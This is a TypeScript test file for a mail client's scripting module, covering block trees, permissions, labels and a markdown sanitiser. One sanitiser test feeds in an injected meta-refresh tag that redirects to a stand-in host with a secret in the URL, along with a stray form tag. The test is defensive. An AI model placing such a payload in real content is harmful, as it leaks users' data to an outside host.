import { describe, expect, it } from 'vitest'
import {
  emptyTree,
  entryDescription,
  entryLabel,
  inertMarkdown,
  inputsDiffer,
  newInput,
  parseTree,
  permissionDef,
  riskyFunctions,
  serializeTree,
  toInput,
  triggerTakesMessage,
  unapproved,
  withTriggerPermission,
  type BlockTree,
} from './scripting'
import { catalogFixture, scriptFixture } from '../test/scriptfixtures'

const say = (key: string): string => ({ 'scripts.perm.mail.read': 'Read mail', 'scripts.perm.mail.read.desc': 'See mail' })[key] ?? key

describe('block trees', () => {
  it('round trips through JSON', () => {
    const tree: BlockTree = {
      version: 1,
      blocks: [
        {
          id: 'b1',
          kind: 'if',
          branches: [{ when: { kind: 'condition', type: 'mail.subject', args: { op: { value: 'contains' }, value: { value: 'x' } } }, body: [{ id: 'b2', kind: 'action', type: 'mail.flag' }] }],
          else: [{ id: 'b3', kind: 'stop' }],
        },
      ],
    }
    expect(parseTree(serializeTree(tree))).toEqual(tree)
  })

  it('reads an empty or broken tree as empty', () => {
    expect(parseTree('')).toEqual(emptyTree())
    expect(parseTree('{nope')).toEqual(emptyTree())
    expect(parseTree('{"blocks": 3}')).toEqual(emptyTree())
  })
})

describe('labels', () => {
  it('uses the translation, then the fallback text, then the id', () => {
    expect(entryLabel(say, { labelKey: 'scripts.perm.mail.read', id: 'mail.read' })).toBe('Read mail')
    expect(entryLabel(say, { labelKey: 'x.net', label: 'Web requests', id: 'net' })).toBe('Web requests')
    expect(entryLabel(say, { labelKey: 'x.none', id: 'raw.id' })).toBe('raw.id')
    expect(entryDescription(say, { descKey: 'scripts.perm.mail.read.desc' })).toBe('See mail')
    expect(entryDescription(say, { descKey: 'missing', description: 'Fallback' })).toBe('Fallback')
  })
})

describe('permissions', () => {
  it('adds the permission a trigger needs once', () => {
    expect(withTriggerPermission(catalogFixture, 'mail.arrived', [])).toEqual(['mail.read'])
    expect(withTriggerPermission(catalogFixture, 'mail.arrived', ['mail.read'])).toEqual(['mail.read'])
    expect(withTriggerPermission(catalogFixture, 'app.start', ['x'])).toEqual(['x'])
  })

  it('lists what is still to approve', () => {
    expect(unapproved(scriptFixture({ approved: ['mail.read'] }))).toEqual(['mail.modify'])
  })

  it('finds a targeted permission by its base', () => {
    expect(permissionDef(catalogFixture, 'net:example.org')?.risk).toBe('high')
  })

  it('offers allow-without-asking only for risky calls the script may make', () => {
    expect(riskyFunctions(catalogFixture, ['mail.read'])).toEqual([])
    expect(riskyFunctions(catalogFixture, ['mail.send'])).toEqual(['mail.send'])
  })
})

describe('inputs', () => {
  it('detects edits', () => {
    const s = scriptFixture()
    const a = toInput(s)
    expect(inputsDiffer(a, toInput(s))).toBe(false)
    expect(inputsDiffer({ ...a, name: 'x' }, a)).toBe(true)
  })

  it('starts a block script with an empty tree', () => {
    expect(parseTree(newInput('blocks', 'n').blocks)).toEqual(emptyTree())
    expect(newInput('lua', 'n').source).toContain('log.info')
  })

  it('knows which triggers run on a message', () => {
    expect(triggerTakesMessage(catalogFixture, 'mail.arrived')).toBe(true)
    expect(triggerTakesMessage(catalogFixture, 'app.start')).toBe(false)
  })
})

describe('inertMarkdown', () => {
  it('turns html outside code into text', () => {
    const md = '<meta http-equiv="refresh" content="0;url=https://x.example/?d=secret">\n**hi** <form action=x><b>'
    const out = inertMarkdown(md)
    expect(out).not.toMatch(/<[a-z]/i)
    expect(out).toContain('**hi**')
  })

  it('leaves code alone', () => {
    const md = 'use `a < b` here\n```\nif a < b then\n```\n<b>'
    expect(inertMarkdown(md)).toBe('use `a < b` here\n```\nif a < b then\n```\n&lt;b>')
  })
})
